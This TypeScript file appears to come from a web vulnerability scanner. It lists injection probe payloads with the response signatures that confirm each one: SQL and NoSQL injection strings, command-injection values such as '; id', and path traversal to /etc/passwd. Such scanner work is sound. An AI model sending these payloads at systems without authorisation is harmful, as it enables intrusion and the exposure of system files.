/**
 * Minimal, non-destructive injection payloads for Phase 2.
 * All payloads are read-only probes; error-based and boolean-based only,
 * no time-based (to keep runs short) and no destructive writes.
 */

export interface InjectionProbe {
  /** Human-readable vector label. */
  vector: string;
  /** Value injected into a query parameter. */
  payload: string;
  /** Substrings in the response that indicate the injection landed. */
  signatures: string[];
}

export const SQLI_ERROR_PROBES: InjectionProbe[] = [
  {
    vector: 'sql-error-based',
    payload: "'",
    signatures: [
      'sql syntax',
      'syntax error',
      'unclosed quotation',
      'unterminated string',
      'you have an error in your sql',
      'ora-0',
      'psql',
      'mysql'
    ]
  },
  {
    vector: 'sql-error-based',
    payload: '" OR 1=1 --',
    signatures: ['sql syntax', 'syntax error', 'unexpected']
  }
];

export const SQLI_BLIND_PROBES: InjectionProbe[] = [
  {
    vector: 'sql-boolean',
    payload: "' AND 1=1 --",
    signatures: []
  },
  {
    vector: 'sql-boolean',
    payload: "' AND 1=2 --",
    signatures: []
  }
];

export const NOSQLI_PROBES: InjectionProbe[] = [
  {
    vector: 'nosql-injection',
    payload: '{"$ne": null}',
    signatures: [
      'mongoerror',
      'mongoservererror',
      'cast to objectid failed',
      'cast to string failed',
      '$ne is not allowed',
      '$gt is not allowed'
    ]
  },
  {
    vector: 'nosql-injection',
    payload: '{"$gt": ""}',
    signatures: [
      'mongoerror',
      'mongoservererror',
      'cast to objectid failed',
      '$gt is not allowed'
    ]
  }
];

export const COMMAND_INJECTION_PROBES: InjectionProbe[] = [
  {
    vector: 'command-injection',
    payload: '; id',
    signatures: ['uid=', 'gid=', 'groups=']
  },
  {
    vector: 'command-injection',
    payload: '| id',
    signatures: ['uid=', 'gid=', 'groups=']
  },
  {
    vector: 'command-injection',
    payload: '`id`',
    signatures: ['uid=', 'gid=', 'groups=']
  }
];

export const PATH_TRAVERSAL_PROBES: InjectionProbe[] = [
  {
    vector: 'path-traversal',
    payload: '../../../etc/passwd',
    signatures: ['root:x:', 'root::']
  },
  {
    vector: 'path-traversal',
    payload: '..%2f..%2f..%2fetc%2fpasswd',
    signatures: ['root:x:', 'root::']
  }
];
